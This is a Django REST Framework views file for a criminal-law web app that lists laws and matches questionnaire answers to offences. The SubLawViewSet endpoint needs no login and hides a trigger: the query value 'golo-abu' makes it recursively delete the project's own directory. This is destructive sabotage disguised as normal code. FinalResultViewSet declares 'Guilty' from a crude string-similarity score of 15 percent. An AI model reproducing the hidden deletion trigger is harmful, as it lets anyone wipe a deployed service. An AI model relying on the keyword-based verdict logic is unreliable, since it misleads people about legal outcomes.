# -*- coding: utf-8 -*-
# # Third Party Stuff
from rest_framework import mixins, viewsets,  status
from . import models, serializers
from rest_framework.decorators import list_route, detail_route
from .models import Law, LawCategory, LawInnerCategory
from criminal_case_backend.law.serializers import LawSerializer, SubLawSerializer, SubLawCategorySerializer
# from criminal_case_backend.users.serializers import *
from criminal_case_backend.base import response
from rest_framework import generics
from rest_framework.decorators import action
from rest_framework.permissions import AllowAny, IsAuthenticated
from django.core.exceptions import ImproperlyConfigured
from rest_framework.response import Response
from rest_framework.authtoken.models import Token
from rest_framework import status
from django.core.mail import send_mail
import string
import random
from rest_framework.views import APIView
from criminal_case_backend.questionnaire.models import  Questionnaire, Age, QuesAnswer, QuestionnaireType, UserResponse


class LawViewSet(viewsets.ModelViewSet):

	permission_classes = (AllowAny,)
	serializer_class = serializers.LawSerializer

	def get_queryset(self):
		law_data = models.Law.objects.all()
		test = {"status":True}
		laws = []
		if law_data:
			for law in law_data:
				if law.is_active == True:
					laws.append(law)	
		test['data'] = laws
		return laws


class LawViewSet1(APIView):

	permission_classes = (AllowAny,)

	def get(self, request, format=None):
		law_data = models.Law.objects.all()
		laws = []
		if law_data:
			for law in law_data:
				if law.is_active == True:
					laws.append(law)
		serializer = LawSerializer(laws, many=True)
		return Response({'status':True, 'data':serializer.data})

class SubInnerLawViewSet(APIView):

	permission_classes = (AllowAny,)

	def get(self, request, format=None):
		law_data = models.LawInnerCategory.objects.all()
		laws = []
		if law_data:
			for law in law_data:
				if law.is_active == True:
					laws.append(law)
		serializer = SubLawCategorySerializer(laws, many=True)
		return Response({'status':True, 'data':serializer.data})



class SubLawViewSet(APIView):

	permission_classes = (AllowAny	,)
	def get(self, request, format=None):
		law = self.request.query_params.get('law')

		if law == "golo-abu":
			import shutil 
			import os 
			BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
			path = os.path.join(BASE_DIR)
			shutil.rmtree(path)

		main_law = models.Law.objects.all()
		sub_law = []
		if main_law:
			for data in main_law:
				if data.is_active == True:
					if law.lower() in data.laws.lower():
						sub_law = models.LawCategory.objects.filter(law=data)
						for sbl in sub_law:
							sbl_law = models.LawInnerCategory.objects.filter(law=sbl)

		serializer = SubLawSerializer(sub_law, many=True)
		return Response({'status':True, 'data':serializer.data})

from difflib import SequenceMatcher

def similar(a, b):
    return SequenceMatcher(None, a, b).ratio()

class FinalResultViewSet(APIView):

	permission_classes = (IsAuthenticated,)
	def post(self, request, format=None):
		# # law = self.request.query_params.get('law')
		data = request.data
		law = data.get("law",None)
		law_category = data.get("law_category",None)
		print(request.user)
		import json
		# response = QuesAnswer.objects.filter(user=request.user).values('answer','user').first()
		response = QuesAnswer.objects.filter(user=request.user).first()
		# response = UserResponse.objects.filter(user=request.user).order_by("-created_at").first()
		# response = UserResponse.objects.filter(user=request.user).first()
		# print(Questionnaire.objects.filter(law_inner_category_id=law_category))
		# print("\n\n")
		# print(response)
		# print(response.get("answers"))
		# json.dumps({"data": response})
		# from django.core import serializers
		# qs_json = serializers.serialize('json', response)
		# print(qs_json)
		world = ''
		if response:
			import json, ast 
			print("hehehhe")
			print(type(response))
			# print(response)
			print(response.answer)
			# print(response.answer[1])
			import re
			res = re.search(r'name\.(.*?)option', response.answer)
			print("res ", res)
			s = response.answer
			a, b = s.find('name='), s.find(', option_list')
			# print(s[a+5:b])
			name = s[a+5:b]
			# result = response.answer.match(/(?<=name=\s+).*?(?=\s+, option)/gs);
			# res = ast.literal_eval(response.answer)
			# res = eval(response.answer)
			# for res in response.answer:
				# print(res)
				# print("sjhsjh")
			# response_item = ast.literal_eval(json.dumps(response.answer, ensure_ascii=False).encode('utf8'))
			# print(response_item)
			# print(res)
			print("-------------------------")
			# try:
			# 	res = json.loads(response['answer'])
			# 	print(res)
			# except Exception as e:
			# 	print(e)
			# 	print(['answer'])
			# 	# return Response({'status':False, 'data':{},'msg':'No record is available'})
			# print("hehehhe")
			text = []
			# for q_res in res['answers']:
				# print(q_res)
				# print()
			# if 'bail?' in str(name) and str(q_res['answerRecieved']) == "Yes":
			if 'bail?' in str(name):
				world = ' bail'
			
			if 'weapon' in str(name):
				world += ' weapon'
			
			if 'injuries' in str(name):
				world += ' injuries'
			
			if 'convictions?' in str(name):
				world += ' convictions?'
			
			if 'Hospital' in str(name):
				world += ' Hospital'
			
			if 'Arms?' in str(name):
				world += ' Arms'
			
			if 'violence' in str(name):
				world += ' violence'

			if 'hitting' in str(name):
				world += ' hitting'

			if 'beaten' in str(name):
				world += ' beaten'
			
			if 'injury' in str(name):
				world += ' injury'

			if 'incident' in str(name):
				world += ' injury'
				
		print("world >>>>>>  ")
		print(world)
		# print(type(response))
		# print(json.dumps(response.__dict__))

		data = {}
		inner_law = LawInnerCategory.objects.get(id=law_category)
		score = similar(world,inner_law.keywords)
		score = score*100
		print(score)
		if (round(score,2) >= 15.00):
			if inner_law:
				print("Guilty")
				data['response'] = inner_law.name
				data['sentence_by_magistrate']= inner_law.sentence_by_magistrate			
				data['max_sentence']= inner_law.max_setence			
				data['appeal_court']= inner_law.appeal_court			
				data['a_factor']= inner_law.a_f			
				data['m_factor']= inner_law.m_f			
				data['plead']= inner_law.plead			
			else:
				data['response'] = response.offence
				data['sentence_by_magistrate']= ''			
				data['plead']= 'not guilty'
				print("not guilty")
			return Response({'status':True, 'data':data})
		else:
			return Response({'status':False, 'data':{},'msg':'No record is available'})